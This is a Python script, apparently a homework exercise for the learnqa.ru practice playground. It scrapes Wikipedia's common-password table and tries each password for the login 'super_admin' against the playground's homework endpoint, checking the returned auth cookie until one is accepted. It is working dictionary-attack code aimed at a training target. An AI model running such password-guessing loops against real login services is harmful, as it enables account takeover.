import requests
import re

url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
login = 'super_admin'
wiki_url = 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords'

def precondition_extracted(response):
    before_pattern = r'Top 25 most common passwords by year according to SplashData(.*?)</table>'
    match = re.search(before_pattern, response.text, re.DOTALL)
    if match:
        response_text = match.group(1).strip()
        return response_text
    else:
        print("Участок текста не найден")

def extracted_password(response_text):
    pattern = r'<td align="left">(.*?)</td>'
    passwords = re.findall(pattern, response_text, re.DOTALL)
    passwords = [password.strip() for password in passwords]
    return passwords

def wiki_information():
    response = requests.get(wiki_url)
    if response.status_code == 200:
        return response
    else:
        print("Ошибка при получении страницы:", response.status_code)

def cracker_two(login, password):
    response = requests.post(url, data={"login": login, "password": password})
    auth_cookie = response.cookies.get('auth_cookie')
    if not auth_cookie:
        print("Не удалось получить авторизационную cookie")
        return False
    response_check_url = requests.post(check_url, cookies={"auth_cookie": auth_cookie})
    response_check = response_check_url.text.strip()
    if response_check == "You are authorized":
        print(f" Пароль найден! - {response_check}: пароль - {password}")
        return True
    else:
        print(f"Неправильный пароль - {password}")
        return False

def cracker():
    response = wiki_information()
    if response:
        response_text = precondition_extracted(response)
        if response_text:
            passwords = extracted_password(response_text)
            for password in passwords:
                result = cracker_two(login, password)
                if result:
                    break
        else:
            print("Не удалось извлечь пароли со страницы")
    else:
        print("Не удалось получить данные с Wiki.")

cracker()
